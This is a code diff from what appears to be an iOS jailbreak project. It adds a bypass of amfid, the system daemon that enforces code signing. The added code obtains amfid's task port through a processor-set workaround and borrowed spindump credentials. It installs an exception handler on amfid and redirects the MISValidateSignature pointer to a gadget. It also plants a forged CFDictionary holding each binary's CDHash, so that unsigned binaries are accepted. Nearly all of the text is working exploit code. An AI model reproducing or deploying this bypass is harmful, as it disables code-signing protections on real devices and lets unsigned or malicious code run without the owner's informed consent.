@@ -44,6 +44,8 @@
 #include "kutils.h"
 #include "../include/lib/tq/utils.h"
 
+#define TRUST_CDHASH_LEN (20)
+
 pthread_attr_t pth_commAttr = {0};
 size_t amfid_fsize = 0;
 
@@ -52,7 +54,51 @@ uint64_t self_cached_creds = 0;
 uint64_t spindump_proc_cred = 0;
 pid_t spindump_pid = 0;
 
+/* Amfid related variables */
+mach_port_t amfid_exception_port = MACH_PORT_NULL;
 
+void* rmem(mach_port_t tp, uint64_t addr, uint64_t len) {
+    kern_return_t err;
+    uint8_t* outbuf = (uint8_t*)malloc(len);
+    vm_size_t outsize = len;
+    
+    err = vm_read_overwrite(tp, addr, len, (vm_address_t)outbuf, &outsize);
+    if (err != KERN_SUCCESS) {
+        (printf)("read failed\n");
+        return NULL;
+    }
+    
+    return outbuf;
+}
+
+
+bool check_if_amfid_has_entitParser(void){
+    return true;
+}
+
+mach_port_t task_for_pid_workaround(int Pid){
+    host_t        myhost = mach_host_self();
+    mach_port_t   psDefault;
+    mach_port_t   psDefault_control;
+    task_array_t  tasks;
+    mach_msg_type_number_t numTasks;
+    int i;
+    kern_return_t kr;
+    kr = processor_set_default(myhost, &psDefault);
+
+    kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
+    if (kr != KERN_SUCCESS) { fprintf(stderr, "-> host_processor_set_priv failed with error %x\n", kr);
+    mach_error("host_processor_set_priv",kr); exit(1);}
+    kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
+    if (kr != KERN_SUCCESS) { fprintf(stderr,"-> processor_set_tasks failed with error %x\n",kr); exit(1); }
+    for (i = 0; i < numTasks; i++){
+        int pid;
+        pid_for_task(tasks[i], &pid);
+        if (pid == Pid) return (tasks[i]);
+    }
+
+    return (MACH_PORT_NULL);
+}
 
 /*!
     @function safepatch_swap_spindump_cred
@@ -72,9 +118,6 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
         spindump_pid = 0;
         pid_t fpid = 0;
         printf("-> Swapping spindump credentials....\t%s\n", look_for_proc("/usr/sbin/spindump") ? "(Spindump running already)" : "(Spindump not running)");
-        
-
-        
         if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
             printf("-> Spawning spindump. This may take some time...\n");
             if((fpid = fork()) == 0){
@@ -267,8 +310,178 @@ kptr_t binary_load_address(mach_port_t target_port){
     return target_first_addr;
 }
 
+void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint64_t shadowp){
+    // Build a self-contained, remote-address-adapted CFDictionary instance
+    
+    CFDataRef _cfhash_cfdata = CFDataCreate(kCFAllocatorDefault, input_cdHash, TRUST_CDHASH_LEN);
+    void *cfhash_cfdata = (void*)_cfhash_cfdata;
+    const char *iomatch_key = "CdHash";
+    
+    size_t key_len = strlen(iomatch_key) + 0x11;
+    key_len = (~0xF) & (key_len + 0xF);
+    size_t value_len = 0x60; // size of self-contained CFData instance
+    value_len = (~0xF) & (value_len + 0xF);
+    size_t total_len = key_len + value_len + 0x40;
+    
+    *out_size = total_len;
+    char *writep = (char *)calloc(1, total_len);
+    
+    char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
+    const char *keys[] = {realCFString};
+    const char *values[] = {realCFString};
+    char *realCFDic = (char*)CFDictionaryCreate(0, (const void**)keys, (const void**)values, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFRetain(realCFDic); // Pump in some extra lifes
+    CFRetain(realCFDic);
+    CFRetain(realCFDic);
+    CFRetain(realCFDic);
+    memcpy(writep, realCFDic, 0x40);
+    
+    writep = writep + total_len - value_len;
+    shadowp = shadowp + total_len - value_len;
+    uint64_t value = shadowp;
+    memcpy(writep, cfhash_cfdata, 0x60);
+    CFRelease(cfhash_cfdata);
+    
+    writep -= key_len;
+    shadowp -= key_len;
+    uint64_t key = shadowp;
+    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
+    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
+    *(uint8_t*)(writep + 16) = strlen(iomatch_key);
+    memcpy(writep + 17, iomatch_key, strlen(iomatch_key));
+    
+    writep -= 0x40;
+    shadowp -= 0x40;
+    *(uint64_t*)(writep + 0x10) = 0x41414141;
+    *(uint64_t*)(writep + 0x18) = 0x42424242;
+    *(uint64_t*)(writep + 0x20) = key;
+    *(uint64_t*)(writep + 0x28) = value;
+    *(uint64_t*)(writep + 0x30) = 0;
+    *(uint64_t*)(writep + 0x38) = 0;
+    
+    CFRelease(realCFDic);
+    CFRelease(realCFDic);
+    CFRelease(realCFDic);
+    CFRelease(realCFDic);
+    CFRelease(realCFDic);
+    CFRelease(realCFString);
+    
+    return writep;
+}
 
+
+#pragma pack(4)
+typedef struct {
+    mach_msg_header_t Head;
+    mach_msg_body_t msgh_body;
+    mach_msg_port_descriptor_t thread;
+    mach_msg_port_descriptor_t task;
+    NDR_record_t NDR;
+} exception_raise_request; // the bits we need at least
+
+typedef struct {
+    mach_msg_header_t Head;
+    NDR_record_t NDR;
+    kern_return_t RetCode;
+} exception_raise_reply;
+#pragma pack()
+
+uint64_t reserved_mem_in_amfid = 0;
+uint64_t update_cdhash_in_amfid = 0;
+uint64_t update_retainCnt_in_amfid = 0;
 void* amfid_exception_handler(void* arg){
+    uint32_t size = 0x1000;
+    mach_msg_header_t* msg = (mach_msg_header_t*)malloc(size);
+        for(;;){
+            kern_return_t err;
+            printf("calling mach_msg to receive exception message from amfid\n");
+            err = mach_msg(msg,
+                           MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
+                           0,
+                           size,
+                           amfid_exception_port,
+                           0,
+                           0);
+            if (err != KERN_SUCCESS){
+                printf("error receiving on exception port: %s\n", mach_error_string(err));
+            } else {
+                (printf)("got exception message from amfid!\n");
+                
+                exception_raise_request* req = (exception_raise_request*)msg;
+                
+                mach_port_t thread_port = req->thread.name;
+                mach_port_t task_port = req->task.name;
+                _STRUCT_ARM_THREAD_STATE64 old_state = {0};
+                mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
+                err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
+                if (err != KERN_SUCCESS){
+                    printf("error getting thread state: %s\n", mach_error_string(err));
+                    continue;
+                }
+                
+                _STRUCT_ARM_THREAD_STATE64 new_state;
+                memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
+                
+                // get the filename pointed to by X23 (or x24 after iOS 13.5)
+                char* filename = (char*)rmem(task_port, check_if_amfid_has_entitParser()?new_state.__x[24]:new_state.__x[23], 1024);
+                (printf)("got filename for amfid request: %s\n", filename);
+
+                uint8_t *cdhash = (uint8_t *)CDHashFor(filename);
+                if(cdhash){
+                    uint32_t offset_to_store = 0x50;
+                    if(reserved_mem_in_amfid == 0){
+                        // Allocate a page of memory in amfid, where we stored cfdic for bypass signature valid
+                        vm_allocate(task_port, (vm_address_t*)&reserved_mem_in_amfid, 0x4000, VM_FLAGS_ANYWHERE);
+                        (printf)("reserved_mem_in_amfid: 0x%llx\n", reserved_mem_in_amfid);
+                        
+                        kapi_write64(reserved_mem_in_amfid + 0x28, 0);
+                        size_t out_size = 0;
+                        char *fakedic = (char *)Build_ValidateSignature_dic(cdhash, &out_size, reserved_mem_in_amfid + offset_to_store);
+                        kapi_write(reserved_mem_in_amfid + offset_to_store, fakedic, (uint32_t)out_size);
+                        update_cdhash_in_amfid = reserved_mem_in_amfid + offset_to_store + 0x70; // To update cdhash in the same cfdic
+                        update_retainCnt_in_amfid = *(uint64_t*)(fakedic); // To keep dic away from being release
+                        free(fakedic);
+                    }
+                    else{
+                        if(cdhash){
+                            for (int i = 0; i < TRUST_CDHASH_LEN; i++){
+                                kapi_write(update_cdhash_in_amfid + i, (void *)cdhash[i], sizeof((void *)cdhash[i]));
+                            }
+                            kapi_write(reserved_mem_in_amfid + offset_to_store, (void *)update_retainCnt_in_amfid, 8);
+                        }
+                    }
+                    free(cdhash);
+                }
+                kapi_write64(old_state.__x[2], reserved_mem_in_amfid + 0x50);
+                new_state.__x[8] = reserved_mem_in_amfid; // For the next encouter instr: LDR  X0, [X8,#0x28] <- Clear out X0 as success return
+                
+                
+                // set the new thread state:
+                err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
+                
+                exception_raise_reply reply = {0};
+                
+                reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
+                reply.Head.msgh_size = sizeof(reply);
+                reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
+                reply.Head.msgh_local_port = MACH_PORT_NULL;
+                reply.Head.msgh_id = req->Head.msgh_id + 100;
+                
+                reply.NDR = req->NDR;
+                reply.RetCode = KERN_SUCCESS;
+                
+                err = mach_msg(&reply.Head,
+                               MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                               (mach_msg_size_t)sizeof(reply),
+                               0,
+                               MACH_PORT_NULL,
+                               MACH_MSG_TIMEOUT_NONE,
+                               MACH_PORT_NULL);
+                
+                mach_port_deallocate(mach_task_self(), thread_port);
+                mach_port_deallocate(mach_task_self(), task_port);
+            }
+        }
     return NULL;
 }
 
@@ -280,7 +493,6 @@ void set_exception_handler(mach_port_t amfid_task_port){
     }
     
     // allocate a port to receive exceptions on and assign rights:
-    mach_port_t amfid_exception_port = MACH_PORT_NULL;
     if((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port)) != KERN_SUCCESS) printf("Allocating a new task port failed.\t(%d)\n", ret);
     if((ret = mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND)) != KERN_SUCCESS) printf("Inserting rights to amfid_exception_port failed.\t(%d)\n", ret);
 
@@ -291,7 +503,7 @@ void set_exception_handler(mach_port_t amfid_task_port){
         return;
     }
     
-    printf("Attempting to set exception handler...\t(0x%x --> 0x%x)\n", amfid_exception_port, amfid_task_port);
+    printf("--> Attempting to set exception handler...\t(0x%x --> 0x%x)\n", amfid_exception_port, amfid_task_port);
     
     kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                  EXC_MASK_ALL,
@@ -300,9 +512,9 @@ void set_exception_handler(mach_port_t amfid_task_port){
                                                  6);
     
     if (err != KERN_SUCCESS){
-        (printf)("error setting amfid exception port: %s\t(%d)\n", mach_error_string(err), err);
+        (printf)("--> Error setting amfid exception port: %s\t(%d)\n", mach_error_string(err), err);
     } else {
-        (printf)("set amfid exception port: succeed!\n");
+        (printf)("--> Set amfid exception port: succeed!\n");
         pthread_t exception_thread;
         pthread_create(&exception_thread, &pth_commAttr, amfid_exception_handler, NULL);
     }
@@ -340,7 +552,6 @@ kptr_t perform_amfid_patches(){
     printf("* ------- AMFID Patches -------- *\n");
     uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
     printf("Extracted AMFID Offsets:\n\n");
-    
     /** Finding Amfid related offsets */
     kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
     printf("----> MISValidate:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
@@ -354,16 +565,21 @@ kptr_t perform_amfid_patches(){
 
     /** Swap Spindump creds with local ones */
     safepatch_swap_spindump_cred(g_exp.self_proc);
+    
+    mach_port_t remoteTask = task_for_pid_workaround(amfid_pid);
 
     kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
     if(ret == KERN_SUCCESS){
-        kptr_t amfid_ipc_entry = ipc_entry_lookup(amfid_task_port);
         printf("----> AMFID Task:\t0x%llx\t\t\t(from proc)\n", kproc_find_by_pid(amfid_pid) + OFFSET(proc, task));
         // debug_dump_ipc_port(amfid_task_port, &amfid_ipc_entry);
-        printf("----> AMFID Port:\t0x%x\n\n", amfid_task_port);
-        set_exception_handler(amfid_task_port);
-        kptr_t amfid_base = binary_load_address(amfid_task_port);
-        printf("amfid base:\t0x%llx\n", amfid_base);
-	} else manticore_error("Could not get amfid's service port!\n");
+        printf("----> AMFID Port:\t0x%x\n", remoteTask);
+        set_exception_handler(remoteTask);
+        //set_exception_handler(amfid_task_port);
+        kptr_t amfid_base = binary_load_address(remoteTask);
+        printf("----> AMFID base:\t0x%llx\n", amfid_base);
+        vm_protect(remoteTask, mach_vm_trunc_page(amfid_base + amfid_OFFSET_MISValidate_symbol), 0x4000, false, VM_PROT_READ|VM_PROT_WRITE);
+        uint64_t redirect_pc = amfid_base + amfid_OFFSET_gadget;
+        kapi_write64(amfid_base + amfid_OFFSET_MISValidate_symbol, redirect_pc);
+    } else manticore_error("Could not get amfid's service port!\n");
     return 0;
 }
